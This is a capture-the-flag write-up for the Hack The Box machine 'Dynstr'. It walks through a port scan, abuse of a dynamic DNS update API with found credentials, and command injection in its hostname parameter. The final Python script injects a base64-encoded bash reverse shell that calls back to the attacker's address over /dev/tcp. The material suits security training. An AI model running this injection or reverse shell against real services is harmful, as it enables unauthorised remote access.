---
title: Dynstr
layout: post
author: Bit Criminals Team
date: 2021-06-24 13:35:00 +0530
type: Pentesting
difficulty: Hard
prompt: https://app.hackthebox.eu/machines/dynstr
---

So first of all we run an nmap scan and get the open ports.

```
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http
```
We visit port 80 in our browser and discover the following information:

![](/images/MaskdMafia/dynstr.png)

We referred to these web-pages (documentation was scarce):

[Remote Access API](https://help.dyn.com/remote-access-api/guidelines/)
[Dnsomatic docs](https://www.dnsomatic.com/docs/api)

However, when sending a valid request via browser,we always got the badauth error. So we tried to do it via a script:

```py
import requests, socket

username = ""
password = ""
hostname = "" # your domain name hosted in no-ip.com

# Gets the current public IP of the host machine.
#myip = requests.get('http://api.ipify.org').text

# Gets the existing dns ip pointing to the hostname.
#old_ip = socket.gethostbyname(hostname)

# Noip API - dynamic DNS update.
# https://www.noip.com/integrate/request.
def update_dns(username,password):
    r = requests.get(f"http://{username}:{password}@dyna.htb/nic/update")

    #if r.status_code != requests.codes.ok:
    print(r.content)
    #pass

# Update only when ip is different.
#if myip != old_ip:
    #update_dns(username, password )
#pass

update_dns("dynadns","sndanyd")
```

And we finally saw this message on running the script:

```
good 10.10.14.123
```
On further enumeration we saw that hostname parameter was had command injection so we tried to take advantage of it by sending a reverse shell in base64 and listening on another terminal with netcat. Here's our script for that:

```py
import requests, socket

username = "dynadns"
password = "sndanyd"

'''
    dnsalias.htb
    dynamicdns.htb
    no-ip.htb
'''
myip="10.10.14.124"
hostname = "aa.dnsalias.htb" # your domain name hosted in no-ip.com
ip="10.129.11.122"

# Gets the current public IP of the host machine.
#myip = requests.get('http://api.ipify.org').text

# Gets the existing dns ip pointing to the hostname.
#old_ip = socket.gethostbyname(hostname)

# Noip API - dynamic DNS update.
# https://www.noip.com/integrate/request.
def update_dns(username,password):
    r = requests.get(f"http://{username}:{password}@dyna.htb/nic/update?hostname=`echo YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjEyMy80MjQyIDwmMQ==| base64 -d | bash`\"{hostname}&my={ip}")

    #if r.status_code != requests.codes.ok:
    print(r.content.decode())
    #pass

# Update only when ip is different.
#if myip != old_ip:
    #update_dns(username, password )
#pass

update_dns(username,password)
```
And we get the reverse shell in our terminal !!